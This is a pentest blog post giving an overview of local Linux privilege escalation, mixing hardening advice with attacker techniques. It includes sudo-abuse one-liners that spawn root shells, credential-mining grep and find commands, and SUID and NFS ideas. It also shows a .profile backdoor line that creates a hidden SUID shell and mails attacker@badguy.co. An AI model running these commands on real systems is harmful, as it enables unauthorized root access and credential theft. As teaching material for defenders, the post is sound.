---
layout: post
title:  "Local Linux privilege escalation overview"
date:   2018-10-16 09:00:00
last_update: 2020-11-07 14:00:00
tags: System Pentest
author: Antoine Brunet
permalink: linux-privilege-escalation.html
comments: true
description: "This article will give an overview of the basic Linux privilege escalation techniques. Different scopes will be explained like the kernel, the permission file..."
keywords: "privilege escalation, linux, escalate, root, become root, super user"
---

# Summary

- [I. Introduction](#i-introduction)
- [II. Tools to help doing privilege escalation](#ii-tools-to-help-doing-privilege-escalation)
- [III. Kernel](#iii-kernel)
    - [1. Kernel privilege escalation overview](#1-kernel-privilege-escalation-overview)
    - [2. Kernel information gathering](#2-kernel-information-gathering)
- [IV. Process](#iv-process)
    - [1. Process privilege escalation overview](#1-process-privilege-escalation-overview)
    - [2. Process information gathering](#2-process-information-gathering)
- [V. Mining credentials information](#v-mining-credentials-information)
    - [1. Mining sensitive information to gain a privilege escalation](#1-mining-sensitive-information-to-gain-a-privilege-escalation)
    - [2. Useful commands to mine credentials](#2-useful-commands-to-mine-credentials)
    - [3. Useful tools to mine credentials](#3-useful-tools-to-mine-credentials)
- [VI. Sudo](#vi-sudo)
    - [1. Sudo overview](#1-sudo-overview)
    - [2. Sudo information gathering](#2-sudo-information-gathering)
    - [3. Example of sudo abuse to escalate your privileges](#3-example-of-sudo-abuse-to-escalate-your-privileges)
- [VII. File permission](#vii-file-permission)
    - [1. File permission overview](#1-file-permission-overview)
    - [2. File permission information gathering](#2-file-permission-information-gathering)
- [VIII. Network File System](#viii-network-file-system)
    - [1. NFS overview](#1-nfs-overview)
    - [2. NFS information gathering](#2-nfs-information-gathering)
    - [3. Few ideas to realize a NFS privilege escalation](#3-few-ideas-to-realize-a-nfs-privilege-escalation)
- [IX. Cron](#ix-cron)
    - [1. Cron privilege escalation overview](#1-cron-privilege-escalation-overview)
    - [2. Cron information gathering](#2-cron-information-gathering)
- [X. Other useful information that can be gathered](#x-other-useful-information-that-can-be-gathered)


# I. Introduction

When an attacker succeeds to establish the initial foothold (gain access to a user with restricted privileges), he will seek for a way to increase his privileges (Gain access to another user with more privileges). We call this action a privilege escalation. It can happen in all sorts of applications or systems.

This article will give an overview of the basic Linux privilege escalation techniques. It separates the local Linux privilege escalation in different scopes: kernel, process, mining credentials, sudo, cron, NFS, and file permission. For each, it will give a quick overview, some good practices, some information gathering commands, and an explanation the technique an attacker can use to realize a privilege escalation.
Do not hesitate to share with us your techniques in the comments.

# II. Tools to help doing privilege escalation

There is planty of tools which can help doing privilege escalation. These ones are my favorite:
- [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)
- [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

# III. Kernel

## 1. Kernel privilege escalation overview

A kernel privilege escalation is done with a kernel exploit, and generally give the root access.

There is no way to completely avoid a kernel privilege escalation. But some good practices are good to know. The first one is to always be aware about security reports and keeping your system up to date.

For a kernel privilege escalation the attacker will use a kernel exploit. In order to do so, he will need three conditions:

1. A working exploit
1. The ability to transfer the exploit onto the target
1. The ability to execute the exploit on the target

We are never protected against a kernel vulnerability. So even if you or your company are aware about IT security and are following the CVS publication, you cannot be sure that your system is one hundred percent secured.

For this reason you must influence the last two points. A good practice will be to focus on restricting or removing programs that enable file transfers, such as FTP, SCP, wget, curl or any programs which can permit to realize file transfers. If you need these programs, restrict them to specific users, or IP/domains, the more they will be restricted and the better it will be.

It is also a good practice to remove or restrict the access of all the compilers such as gcc.

Another good practice is to limit directories that are writable or executable, particularly by service dedicated users (such as www-data for Apache).

Finally, it is really important to externalize logs in another machine.

[Center for Internet Security (CIS)](https://www.cisecurity.org/) are providing benchmarks about the best security practices to follow.

## 2. Kernel information gathering

Some basic command to collect some clues to realize a Linux kernel exploitation

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `uname -a` | Print all available system information   |
| `uname -m` or `arch` | Linux kernel architecture (32 or 64 bit) |
| `uname -r` | Kernel release |
| `uname -n` or `hostname` | System hostname |
| `cat /proc/version` | Kernel information |
| `cat /etc/*-release` or `cat /etc/issue` | Distribution information |
| `cat /proc/cpuinfo` | CPU information |
| `df -a` | File system information |
| `dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null` | List available compilers |

# IV. Process

## 1. Process privilege escalation overview

Most of the time an attacker succeeds to establish the initial foothold by using a misconfigured or vulnerable running service, but it does not stop there. An attacker can use a process which is only accessible locally for doing privilege escalation. For example, a vulnerable MySQL database running as root.

Commonly the method attack will be similar to kernel privilege escalation. The attacker will use an exploit, and for that he will need the three conditions we see [above](#kernel-privilege-escalation-overview). Also all the good practice explained in the kernel section can be transposed for the running processes.

A good practice for all your sensitive services (a service which can be accessed from the outside is definitely sensitive) is to run them into a `chroot jail`, at least creating a dedicated user. Never run them as root.

## 2. Process information gathering

Some basic command to collect some clues to realize a privilege escalation by passing through a vulnerable process exploitation.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `ps aux | grep root` | Display service run as root |
| `ps aux | awk '{print $11}'|xargs -r ls -la -- 2>/dev/null | uniq` | Display process binary permission |
| `cat /etc/inetd.conf` or `cat /etc/xinetd.conf` | List services managed by inetd |
| `dpkg -l` | Installed packages (Ubuntu, Debian) |
| `rpm -qa` | Installed packages (RedHat, Fedora Core, Suse Linux, Cento) |
| `pkg_info` | Installed packages (OpenBSD, FreeBSD) |
| `httpd -v` or `apache2 -v` | Apache version |
| `apache2ctl (or apachectl) -M` | List loaded Apache modules |
| `cat /etc/apache2/envvars 2>/dev/null |grep -i 'user|group' |awk '{sub(/.*export /,"")}1'`| Which account is Apache running as |
| `mysql --version` | MYSQL version |
| `psql -V` | Postgres version |

# V. Mining credentials information

## 1. Mining sensitive information to gain a privilege escalation

On a server (it is much more true for a personal computer) you can find many different sensitive information like login, password, private and public keys, certificates... This information can be found and used to access another machine, application or to realize a privilege escalation.

To prevent this kind of leak, you should take care of the access permission of the sensitive directories and files. For example the directory `/home/<user>/.ssh` can normally only be read and write by the owner user (`chmod 600`) or the `/etc/shadow` file which is normally in read write for the root user and in read for the root group (`chomd 640`).

It is also really important to never put any credentials in any code or configuration file. If for any reason, you have to do it, be sure the password is not in clear and the script or config file has specific permission that only allow authorized users to read/write it.

## 2. Useful commands to mine credentials

Here some few commands which can be useful for finding credentials on a Linux system.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `history` | Displays command history of current user |
| `history | grep -B4 -A3 -i 'passwd\|ssh\|host\|nc\|ping' 2>/dev/null` | Check history for interesting information |
| `grep -B3 -A3 -i 'pass\|password\|login\|username\|email\|mail\|host\|ip' /var/log/*.log 2>/dev/null` | Check log file in `/var/log` for password, login, or email information |
| `find / -maxdepth 4 -name '*.conf' -type f -exec grep -Hn 'pass\|password\|login\|username\|email\|mail\|host\|ip' {} \; 2>/dev/null` | Find the configuration files which contain interesting information |

## 3. Useful tools to mine credentials

Here are a few tools that can be helpful for your process.

- [Pupy](https://github.com/n1nj4sec/pupy/)
- [LaZagne](https://github.com/AlessandroZ/LaZagne)
- [gimmecredz](https://github.com/0xmitsurugi/gimmecredz)

# VI. Sudo

## 1. Sudo overview

The `sudo` command makes it possible for a user to execute a command as another user (usually the root account).
A misconfiguration of the sudo command can easily lead to a privilege escalation.

Here are few good practices about sudo configuration:

Do not allow some commands that can permit to execute some code like `vi`, `find`, `bash`, `awk`, `perl` ...

Never configure `sudo` like that `user	ALL=NOPASSWD:ALL`.

Grant the minimum privileges to perform necessary tasks or operations, be as specific as you can. For example if you want to allow a user to listen on a specific interface (`eth0`) with `tcpdump`. You should configure `sudo` as follow `user ALL= (root)   NOPASSWD: /usr/sbin/tcpdump -ttteni eth0`. This configuration will permit to `user` to execute this exact command `/usr/sbin/tcpdump -ttteni eth0` as root. He will have to use this exact options in the same order or it will not work. But for this specific example it's still not the best solution, tcpdump cannot be used like that! The user you allow will need to have access to more options. So a good method to work with `tcpdump` as non root user is to not used sudo and to follow this few steps:

1. create a group `groupadd pcap`
1. add the user you want allow in this group `usermod -a -G pcap user`
1. modify the group ownership and permission of the tcpdump binary `chgrp pcap /usr/sbin/tcpdump` and `chmod 750 /usr/sbin/tcpdump`
1. set the CAP_NET_RAW and CAP_NET_ADMIN capabilities on the tcpdump binary to allow it to run without root access `setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump`
1. optionally, symlink the tcpdump binary to a directory that is in the path for a normal user `ln -s /usr/sbin/tcpdump /usr/local/bin/tcpdump`

## 2. Sudo information gathering

Here is the command you need to get some clues about the possibilities you have to realize a privilege escalation using `sudo`.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `sudo -l` or `sudo -lll` | List the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host |
| `sudo -V` | Sudo version |

## 3. Example of sudo abuse to escalate your privileges

Here are examples of commands an attacker can use to escalate his privileges.

\* I have found most of those commands on the blog [Le journal d'un reverser](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)

| Command                | Explanation                            |
| :-------------------- | :------------------------------- |
| `sudo su` | Become root |
| `perl -e 'exec "/bin/bash";'` | Launch a bash as root |
| `python -c 'import pty;pty.spawn("/bin/bash")'` | Launch a bash as root |
| When you execute one of theses program `less`, `more`, `nano`, `vi`, the `man`, `ftp`, `mysql`, `psql` you can execute some code into like that `!bash` | Launch a bash as root |
| `awk 'BEGIN {system("/bin/bash")}'` | Launch a bash as root |
| `find /home -exec /bin/bash \;` | Launch a bash as root |
| `tcpdump -i lo -w /dev/null -W 1 -G 1 -z /tmp/payload.sh` | Execute the program payload.sh as root |
| `tar c a.tar -I ./payload.sh a` | Execute the program payload.sh as root |
| `zip z.zip a -T -TT ./payload.sh` | Execute the program payload.sh as root |
| `man -P /tmp/payload.sh man` | Execute the program payload.sh as root |
| `export PAGER=./payload.sh` `git -p help`| Execute the program payload.sh as root |
| `export PATH=/tmp:$PATH` `ln -sf /tmp/payload.sh /tmp/git-help` `git --exec-path=/tmp help` | Execute the program payload.sh as root |
| `ls -la .bashrc` `export HOME=.` `bash` | Launch a bash as root |
| `nmap --interactive` `!bash` | Launch a bash as root |

# VII. File permission

## 1. File permission overview

There are a few possibilities to realize a privilege escalation with misconfigured file permission.

First, if you let the read access of a sensitive file like a private key, or a script running as daemon or in the cron.

SUID (Set User ID) or SGID (Set Group ID) files must be avoided as much as possible.
They are needed for tasks that require higher privileges than those which common users have, such as `passwd` command.

```sh
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 47032 May 16  2017 /usr/bin/passwd
```

An attacker can also set up some traps. He can add to the `.profile` some code like this one: `cp /bin/bash /tmp/.hiddenShell && chmod 4777 /tmp/.hiddenShell && mail –s "Shell done" attacker@badguy.co`. This will create a hidden shell `/tmp/.hiddenShell` with the SUID activate and full permissions for all users, finally it will send an email to the attacker. There are plenty of different traps that can be done, the imagination is the only limit.

## 2. File permission information gathering

Some basic commands to collect some clues to realize a privilege escalation abusing file permission.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `find / -perm -4000 -type f 2>/dev/null` | Find SUID files |
| `find / -uid 0 -perm -4000 -type f 2>/dev/null` | Find SUID files owned by root |
| `find / -perm -2000 -type f 2>/dev/null` | Find SGID files (sticky bit) |
| `find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null` | Find world-writeable files excluding `proc` file |
| `find / -type f '(' -name *.cert -or -name *.crt -or -name *.pem -or -name *.ca -or -name *.p12 -or -name *.cer -name *.der ')' '(' '(' -user support -perm -u=r ')' -or '(' -group support -perm -g=r ')' -or '(' -perm -o=r ')' ')' -or -name *.cer -name *.der ')' 2> /dev/null` | Find keys or certificates you can read |
| `find /home –name *.rhosts -print 2>/dev/null` | Find rhost config files |
| `find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;` | Find hosts.equiv, list permissions and cat the file contents |
| `cat ~/.bash_history` | Display current user history |
| `ls -la ~/.*_history` | Dislay the current user various history files |
| `ls -la ~/.ssh/` | Check current user's ssh files |
| `find /etc -maxdepth 1 -name '*.conf' -type f` or `ls -la /etc/*.conf` | List the configuration files in /etc (depth 1, modify the maxdepth param in the first command for change it) |
| `lsof | grep '/home/\|/etc/\|/opt/'` | Display the possibly interesting openfiles |

# VIII. Network File System

## 1. NFS overview

"The Network File System (NFS) is a distributed filesystem that allows users to mount remote filesystems as if they were local. NFS uses a client-server model, in which a server exports directories to be shared, and clients mount the directories to access the files in them. NFS eliminates the need to keep copies of files on several machines by letting the clients all share a single copy of a file on the server."

This definition come from the book :
`Linux in a Nutshell, 3rd Edition` By `Ellen Siever, Stephen Spainhour, Stephen Figgins and Jessica P. Hekman`.

When this service is running on our server we must be very careful and follow some good practices.

We must never configure a file system with `no_root_squash` which will mean that we allow the remote user to write in the server file system as root.

We should specify on `/etc/hosts.allow` the allowed users for our NFS.

Sometimes using NFS can be replaced by a [sshfs](https://linux.die.net/man/1/sshfs).

## 2. NFS information gathering

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `nmap -sV --script=nfs-showmount <IP Server>` | This nmap script will give you the information about the NFS |
| `showmount -e <IP Server>` | Same as the nmap script below but you will have to install a client `apt-get install nfs-common` |

## 3. Few ideas to realize a NFS privilege escalation

There are plenty of possibilities to realize a privilege escalation on a NFS, like:
- create a file giving a shell with the SUID permission.
- create or modify the file `~/.ssh/authorized_keys` with your public key.
- set the SUID permission to a handmade script, or a binary (`/bin/sh`, `/usr/bin/vi`) which will permit to get a shell console.
- modify the `/etc/shadow` and the `/etc/passwd` to create a new user or to change the password of one already existing.
- modify the `sudo` configuration file

# IX. Cron

## 1. Cron privilege escalation overview

The cron daemon schedules commands to be run at specified dates and times.
It runs commands with specific users. So we can try to abuse it to realize a privilege escalation.

A good way to abuse the cron, is to check the file permissions of the scripts it runs.
If the permissions are not well set, an attacker can possibly overwrite the file and easily get the privileges of the user set in the cron.

Another way is to use the wildcard tricks which are well explained in this article [Unix Wildcards Gone Wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

Always use the full path for each command and script you run.

Do not use the root user to set commands un the cron.

## 2. Cron information gathering

Some basic commands to collect some clues to realize a privilege escalation using a misconfigured cron.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `crontab -l` | Display cron of the current user |
| `ls -la /etc/cron*` | Display scheduled jobs overview |

# X. Other useful information that can be gathered

Those commands are really useful to collect some clues to realize a privilege escalation.

| Command                | Result                            |
| :-------------------- | :------------------------------- |
| `whoami` | Print effective userid |
| `id` | Print real and effective user and group IDs |
| `awk -F ':' '{print $1}' /etc/passwd` | List all users on the system |
| `awk -F ':' '{print $1}' /etc/group` | List all groups on the system |
| `last` | Show listing of last logged in users |
| `lastlog` | Foreach users get the last logged in |
| `for i in $(cat /etc/passwd 2>/dev/null| cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null` | List uid and groups for each users |
| `grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'` | List all super users accounts |
| `w` | Show who is logged on and what they are doing |
| `users` or `who -a` | Print the user names of users currently logged in to the current host |
| `cat /etc/shells` | Pathnames of valid login shells |
| `cat /etc/profile` | Display default system variables |
| `cat ~/.profile` | Display user variables and functions |
| `env` | Display environmental variables |
| `route` | Display route information |
| `arp -a` | Display arp table |
| `cat /etc/resolv.conf` | Show configured DNS sever addresses |
| `head /var/mail/root` | Try to read root mail |
| `perl -v` | Perl version |
| `java -version` | Java version |
| `python --version` | Python version|
| `ruby -v` | Ruby version |